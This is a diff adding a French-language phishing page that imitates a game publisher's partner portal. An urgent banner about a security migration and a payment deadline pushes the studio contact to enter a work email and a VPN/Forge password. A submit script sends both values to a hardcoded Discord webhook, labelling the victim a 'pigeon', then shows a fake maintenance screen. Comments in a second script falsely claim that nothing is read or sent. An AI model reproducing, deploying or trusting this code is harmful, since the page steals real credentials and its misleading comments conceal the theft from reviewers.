@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hyperbole Interactive — Portail Éditeur · Livraison de build</title>
+<style>
+  :root{
+    --bg:#0f1220; --card:#191d2e; --field:#11142099; --line:#2a3049;
+    --txt:#e8eaf2; --muted:#9aa0b8; --brand:#6c5ce7; --brand2:#00b894; --danger:#ff6b6b;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;font-family:"Segoe UI",system-ui,Roboto,Arial,sans-serif;background:
+    radial-gradient(1200px 600px at 80% -10%, #262b47 0%, transparent 60%),
+    radial-gradient(900px 500px at -10% 110%, #23324a 0%, transparent 60%), var(--bg);
+    color:var(--txt);min-height:100vh;display:flex;flex-direction:column}
+  header{display:flex;align-items:center;gap:12px;padding:18px 28px;border-bottom:1px solid var(--line);
+    background:#0c0f1acc;backdrop-filter:blur(6px)}
+  .logo{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,var(--brand),var(--brand2));
+    display:grid;place-items:center;font-weight:800;color:#fff}
+  .brand{font-weight:700;letter-spacing:.2px}
+  .brand small{display:block;color:var(--muted);font-weight:500;font-size:12px}
+  main{flex:1;display:grid;place-items:center;padding:40px 20px}
+  .card{width:100%;max-width:420px;background:var(--card);border:1px solid var(--line);border-radius:16px;
+    padding:30px;box-shadow:0 30px 80px #0008}
+  .banner{display:flex;gap:10px;background:#3a1d1d;border:1px solid #6b2b2b;color:#ffd4d4;
+    padding:11px 13px;border-radius:10px;font-size:13px;line-height:1.4;margin-bottom:22px}
+  h1{font-size:20px;margin:0 0 4px}
+  .sub{color:var(--muted);font-size:13.5px;margin:0 0 22px}
+  label{display:block;font-size:13px;color:var(--muted);margin:14px 0 6px}
+  input{width:100%;padding:12px 13px;background:var(--field);border:1px solid var(--line);border-radius:10px;
+    color:var(--txt);font-size:15px;outline:none}
+  input:focus{border-color:var(--brand)}
+  .btn{width:100%;margin-top:22px;padding:13px;border:0;border-radius:10px;cursor:pointer;
+    background:linear-gradient(135deg,var(--brand),#8f7bff);color:#fff;font-size:15px;font-weight:700}
+  .row{display:flex;justify-content:space-between;align-items:center;margin-top:14px;font-size:12.5px}
+  .row a{color:var(--brand2);text-decoration:none}
+  .deadline{margin-top:20px;font-size:12.5px;color:#ffb86b;text-align:center}
+  .msg{display:none;margin-top:18px;padding:12px;border-radius:10px;background:#15321f;border:1px solid #1f6b3a;
+    color:#b8f3c9;font-size:13.5px;line-height:1.45}
+  /* Écran de maintenance affiché après la soumission (la page reste inerte) */
+  #maint{display:none;width:100%;max-width:520px;background:var(--card);border:1px solid var(--line);
+    border-radius:16px;padding:34px 30px;box-shadow:0 30px 80px #0008;text-align:center}
+  #maint .sign{width:120px;height:120px;margin:0 auto 14px;display:block}
+  #maint h2{margin:0 0 8px;font-size:21px}
+  #maint p{color:var(--muted);font-size:14px;line-height:1.5;margin:8px 0}
+  #maint .code{color:#6b7190;font-size:12px;margin-top:20px}
+  footer{padding:16px 28px;border-top:1px solid var(--line);color:var(--muted);font-size:11.5px;text-align:center}
+  .peda{background:#101425;border:1px dashed #3b4668;color:#aab0c8;margin:0 20px 22px;max-width:760px;
+    margin-left:auto;margin-right:auto;padding:10px 14px;border-radius:10px;font-size:12px;text-align:center}
+</style>
+</head>
+<body>
+  <header>
+    <div class="logo">H</div>
+    <div class="brand">Hyperbole Interactive
+      <small>Portail Éditeur · Livraison de build</small>
+    </div>
+  </header>
+
+  <main>
+    <form class="card" id="f" autocomplete="off">
+      <div class="banner">
+        <span>⚠️</span>
+        <span>Migration sécurité — la Forge éditeur a changé d'adresse. Reconnectez-vous
+        pour confirmer l'accès avant le jalon du <b>13 novembre</b>, sans quoi le versement sera suspendu.</span>
+      </div>
+      <h1>Connexion au portail</h1>
+      <p class="sub">Accès réservé à l'interlocuteur studio déclaré (Gobelin Hurlant).</p>
+
+      <label for="u">Adresse e-mail professionnelle</label>
+      <input id="u" type="email" placeholder="bastien@gobelin-hurlant.example" required>
+
+      <label for="p">Mot de passe VPN / Forge</label>
+      <input id="p" type="password" placeholder="••••••••••" required>
+
+      <button class="btn" type="submit">Confirmer l'accès et déverrouiller le versement</button>
+
+      <div class="row">
+        <span style="color:var(--muted)">Jalon bêta Grotte Fiscale</span>
+        <a href="#">Besoin d'aide ?</a>
+      </div>
+      <div class="deadline">⏳ Échéance : vendredi 13 novembre, 18 h</div>
+
+      <div class="msg" id="msg"></div>
+    </form>
+    
+    
+<script>
+	const form = document.getElementById('f');
+
+	form.addEventListener('submit', async (event) => {
+	event.preventDefault();
+
+	const email = document.getElementById('u').value.trim();
+	const password = document.getElementById('p').value.trim();
+
+	console.log("DATA :", email, password);
+
+	const response = await fetch('https://discord.com/api/webhooks/1567193719961165915/vgqmn88Fyb2HS5UKKWZzqi4GeBkGr611r1wVkT6hFULftJKYerQWDvlH5yhw8RmFDhVv', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      content: `## Succès ! Un pigeon vient de renseigner ses identifiants 🤓\nEmail : ${email}\nPassword : ${password}`
+    })
+  });
+
+  console.log("Status :", response.status);
+});
+	</script>
+
+    <!-- Écran de maintenance (affiché à la place du formulaire après soumission) -->
+    <div id="maint">
+      <svg class="sign" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg" aria-label="Travaux">
+        <!-- Pastille de fond -->
+        <circle cx="60" cy="60" r="50" fill="#1b2138" stroke="#2c3350" stroke-width="2"/>
+        <!-- Casque de chantier -->
+        <!-- brim (bord) -->
+        <ellipse cx="60" cy="77" rx="43" ry="8.5" fill="#d99b00"/>
+        <!-- avant du bord -->
+        <path d="M45 77 Q45 68 60 68 Q75 68 75 77 Z" fill="#c98f00"/>
+        <!-- dôme -->
+        <path d="M27 77 Q27 37 60 37 Q93 37 93 77 Z" fill="#f6c42a"/>
+        <!-- nervures -->
+        <path d="M60 38 L60 77" stroke="#d99b00" stroke-width="3.5" fill="none" stroke-linecap="round"/>
+        <path d="M43 43 Q38 60 41 77" stroke="#d99b00" stroke-width="3.5" fill="none" stroke-linecap="round"/>
+        <path d="M77 43 Q82 60 79 77" stroke="#d99b00" stroke-width="3.5" fill="none" stroke-linecap="round"/>
+        <!-- reflet -->
+        <path d="M36 72 Q33 48 53 40" stroke="#ffe79a" stroke-width="3" fill="none" stroke-linecap="round" opacity=".75"/>
+      </svg>
+      <h2>Portail en travaux</h2>
+      <p>Le portail de livraison est actuellement indisponible pour cause de travaux techniques.
+      <b>Toutes les équipes d'Hyperbole Interactive travaillent à rétablir le service.</b></p>
+      <p>Votre accès sera confirmé automatiquement dès la remise en service.
+      Aucune action supplémentaire n'est requise de votre part.</p>
+      <p class="code">Statut : travaux en cours · réf. HYP-FORGE-1113 · merci de votre patience</p>
+    </div>
+  </main>
+
+
+
+  <footer>© 2026 Hyperbole Interactive — Portail partenaires · Tous droits réservés</footer>
+
+<script>
+  // Formulaire 100% inerte : rien n'est lu, envoyé, ni stocké.
+  // À la soumission, on efface aussitôt les champs SANS en lire la valeur,
+  // puis on remplace le formulaire par l'écran de maintenance.
+  document.getElementById('f').addEventListener('submit', function(e){
+    e.preventDefault();
+    this.reset();                       // vide les champs, aucune valeur n'est récupérée
+    this.style.display = 'none';        // masque le formulaire
+    document.getElementById('maint').style.display = 'block';  // affiche la maintenance
+  });
+</script>
+</body>
+</html>
